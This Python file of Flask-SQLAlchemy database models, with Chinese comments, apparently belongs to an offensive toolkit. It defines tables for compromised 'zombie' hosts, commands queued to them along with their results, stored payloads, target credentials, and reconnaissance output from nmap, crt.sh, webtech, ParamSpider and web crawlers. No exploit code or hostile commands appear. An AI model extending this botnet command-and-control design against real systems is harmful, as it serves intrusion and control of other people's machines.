import os
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, UTC
from werkzeug.security import generate_password_hash, check_password_hash
from flask_migrate import Migrate
from threading import Lock
from flask_login import UserMixin

db = SQLAlchemy()
migrate = Migrate()
db_lock = Lock()

class payload(db.Model):
    """負載模型"""
    id = db.Column(db.Integer, primary_key=True)
    payload = db.Column(db.String(255), nullable=False)

class User(db.Model, UserMixin):
    """用戶模型"""
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64), index=True, unique=True)
    password_hash = db.Column(db.String(128))
    registered_on = db.Column(db.DateTime, default=lambda: datetime.now(UTC))
    client_ip = db.Column(db.String(39))
    is_admin = db.Column(db.Boolean, default=False)
    
    # 關聯定義
    commands = db.relationship('Command_User', backref='user', lazy='dynamic')
    targets = db.relationship('Target', backref='user', lazy='dynamic')

    def set_password(self, password):
        """設置用戶密碼的哈希值"""
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        """檢查用戶輸入的密碼是否正確"""
        return check_password_hash(self.password_hash, password)

class ZOMBIE(db.Model):
    """肉雞模型"""
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64), index=True, unique=True)
    session_id = db.Column(db.String(32))
    ip_address = db.Column(db.String(39))
    last_seen = db.Column(db.DateTime, default=lambda: datetime.now(UTC))
    commands = db.relationship('Command_ZOMBIE', backref='zombie', lazy='dynamic')

class Command_ZOMBIE(db.Model):
    """肉雞命令模型"""
    id = db.Column(db.Integer, primary_key=True)
    command = db.Column(db.String(255), nullable=False)
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(UTC))
    user_id = db.Column(db.Integer, db.ForeignKey('zombie.id'), nullable=True)
    is_run = db.Column(db.Boolean, default=False)
    result = db.Column(db.Text, nullable=True)

class Command_User(db.Model):
    """用戶命令模型"""
    id = db.Column(db.Integer, primary_key=True)
    command = db.Column(db.String(255), nullable=False)
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(UTC))
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=True)
    is_run = db.Column(db.Boolean, default=False)
    result = db.Column(db.Text, nullable=True)

class Target(db.Model):
    """目標模型"""
    id = db.Column(db.Integer, primary_key=True)
    target_ip = db.Column(db.String(255), nullable=False)
    target_ip_no_https = db.Column(db.String(255), nullable=False)
    target_port = db.Column(db.Integer)
    target_username = db.Column(db.String(50))
    target_password = db.Column(db.String(50))
    target_status = db.Column(db.String(50), default='pending')
    deep_scan = db.Column(db.Boolean, default=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    #子表
    nmap_results = db.relationship('nmap_Result', backref='target', lazy='dynamic')
    crawlers = db.relationship('crawler', backref='target', lazy='dynamic')
    crtsh_results = db.relationship('crtsh_Result', backref='target', lazy='dynamic')
    webtech_results = db.relationship('webtech_Result', backref='target', lazy='dynamic')

class nmap_Result(db.Model):
    """掃描結果模型"""
    __tablename__ = 'nmap_result'
    id = db.Column(db.Integer, primary_key=True)
    target_id = db.Column(db.Integer, db.ForeignKey('target.id'), nullable=False)
    scan_result = db.Column(db.Text)
    scan_time = db.Column(db.DateTime)
    
    def __init__(self, target_id, scan_result, scan_time):
        self.target_id = target_id
        self.scan_result = scan_result
        self.scan_time = scan_time

class crtsh_Result(db.Model):
    """crtsh掃描結果模型"""
    id = db.Column(db.Integer, primary_key=True)
    target_id = db.Column(db.Integer, db.ForeignKey('target.id', name='fk_crtsh_target'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id', name='fk_crtsh_user'), nullable=False)
    domains = db.Column(db.JSON, nullable=True)  # 存儲域名列表
    total_domains = db.Column(db.Integer, default=0)  # 域名總數
    status = db.Column(db.String(20), nullable=False, default='pending')  # 掃描狀態
    error_message = db.Column(db.Text, nullable=True)  # 錯誤信息
    scan_time = db.Column(db.DateTime, nullable=False, default=datetime.now)  # 掃描時間
    
    def __init__(self, user_id, target_id, domains=None, total_domains=0, status='pending', error_message=None, scan_time=None):
        self.user_id = user_id
        self.target_id = target_id
        self.domains = domains or []
        self.total_domains = total_domains
        self.status = status
        self.error_message = error_message
        self.scan_time = scan_time or datetime.now()

class webtech_Result(db.Model):
    """webtech掃描結果模型"""
    id = db.Column(db.Integer, primary_key=True)
    target_id = db.Column(db.Integer, db.ForeignKey('target.id'), nullable=False)
    webtech_result = db.Column(db.Text, nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)

class crawler(db.Model):
    """爬蟲模型"""
    id = db.Column(db.Integer, primary_key=True)
    error_message = db.Column(db.Text, nullable=True)  # 錯誤信息
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(UTC))
    completed_at = db.Column(db.DateTime, nullable=True)  # 完成時間
    #外建
    target_id = db.Column(db.Integer, db.ForeignKey('target.id', name='fk_crawler_target'), nullable=False)
    #父表
    paramspider_results = db.relationship('ParamSpiderResult', backref='crawler', lazy='dynamic')#ParamSpider掃描結果
    crawler_forms = db.relationship('crawler_form', backref='crawler', lazy='dynamic')#爬蟲表單
    crawler_images = db.relationship('crawler_image', backref='crawler', lazy='dynamic')#爬蟲圖片
    crawler_resources = db.relationship('crawler_resource', backref='crawler', lazy='dynamic')#爬蟲CSS
    crawler_htmls = db.relationship('crawler_html', backref='crawler', lazy='dynamic')#爬蟲HTML
    crawler_js = db.relationship('crawler_js', backref='crawler', lazy='dynamic')#爬蟲JS
class crawler_form(db.Model):
    """爬蟲表單模型"""
    id = db.Column(db.Integer, primary_key=True)
    crawler_id = db.Column(db.Integer, db.ForeignKey('crawler.id', name='fk_form_crawler'), nullable=False)
    form_data = db.Column(db.Text, nullable=False)  # 爬蟲表單數據
    form_type = db.Column(db.String(20), nullable=False)  # 爬蟲表單類型
    form_url = db.Column(db.String(255), nullable=False)  # 爬蟲表單URL
class crawler_image(db.Model):
    """爬蟲圖片模型"""
    id = db.Column(db.Integer, primary_key=True)
    crawler_id = db.Column(db.Integer, db.ForeignKey('crawler.id', name='fk_image_crawler'), nullable=False)
    image_url = db.Column(db.String(255), nullable=False)  # 爬蟲圖片URL
    image_size = db.Column(db.Integer, nullable=True)  # 爬蟲圖片大小
    image_path = db.Column(db.String(255), nullable=True)  # 爬蟲圖片路徑
    image_content = db.Column(db.LargeBinary, nullable=True)  # 爬蟲圖片內容，存儲二進制數據
class crawler_html(db.Model):
    """爬蟲HTML模型"""
    id = db.Column(db.Integer, primary_key=True)
    crawler_id = db.Column(db.Integer, db.ForeignKey('crawler.id', name='fk_html_crawler'), nullable=False)
    html_content = db.Column(db.Text, nullable=False)  # 爬蟲HTML內容
    html_url = db.Column(db.String(255), nullable=True)  # 爬蟲HTMLURL
class crawler_js(db.Model):
    """爬蟲JS模型"""
    id = db.Column(db.Integer, primary_key=True)
    crawler_id = db.Column(db.Integer, db.ForeignKey('crawler.id', name='fk_js_crawler'), nullable=False)
    js_content = db.Column(db.Text, nullable=False)  # 爬蟲JS內容
    js_url = db.Column(db.String(255), nullable=True)  # 爬蟲JSURL
class crawler_resource(db.Model):#爬蟲CSS
    """爬蟲資源模型"""
    id = db.Column(db.Integer, primary_key=True)
    crawler_id = db.Column(db.Integer, db.ForeignKey('crawler.id', name='fk_resource_crawler'), nullable=False)
    resource_url = db.Column(db.String(255), nullable=False)  # 爬蟲資源URL
    resource_type = db.Column(db.String(20), nullable=False)  # 爬蟲資源類型
    resource_data = db.Column(db.Text, nullable=False)  # 爬蟲資源數據
class ParamSpiderResult(db.Model):
    """ParamSpider 爬取結果模型"""
    __tablename__ = 'paramspider_results'
    
    id = db.Column(db.Integer, primary_key=True)
    target_id = db.Column(db.Integer, db.ForeignKey('target.id'), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    crawler_id = db.Column(db.Integer, db.ForeignKey('crawler.id'), nullable=False)
    
    exclude = db.Column(db.String(255))
    threads = db.Column(db.Integer)
    
    status = db.Column(db.String(50))
    error_message = db.Column(db.Text)
    result_text = db.Column(db.Text)
    total_urls = db.Column(db.Integer, default=0)
    unique_parameters = db.Column(db.Integer, default=0)
    
    created_at = db.Column(db.DateTime, default=datetime.now)
    updated_at = db.Column(db.DateTime, default=datetime.now, onupdate=datetime.now)

    @classmethod
    def get_by_crawler_id(cls, crawler_id):
        """通過 crawler_id 獲取掃描結果"""
        return cls.query.filter_by(crawler_id=crawler_id).first()

    @classmethod
    def get_by_target_id(cls, target_id):
        """通過 target_id 獲取所有掃描結果"""
        return cls.query.filter_by(target_id=target_id).all()

    @classmethod
    def get_by_user_id(cls, user_id):
        """通過 user_id 獲取所有掃描結果"""
        return cls.query.filter_by(user_id=user_id).all()

    @classmethod
    def get_latest_by_target(cls, target_id):
        """獲取目標的最新掃描結果"""
        return cls.query.filter_by(target_id=target_id).order_by(cls.created_at.desc()).first()

    def to_dict(self):
        """將結果轉換為字典格式"""
        return {
            'id': self.id,
            'target_id': self.target_id,
            'user_id': self.user_id,
            'crawler_id': self.crawler_id,
            'exclude': self.exclude,
            'threads': self.threads,
            'status': self.status,
            'error_message': self.error_message,
            'result_text': self.result_text,
            'total_urls': self.total_urls,
            'unique_parameters': self.unique_parameters,
            'created_at': self.created_at.strftime('%Y-%m-%d %H:%M:%S'),
            'updated_at': self.updated_at.strftime('%Y-%m-%d %H:%M:%S')
        }






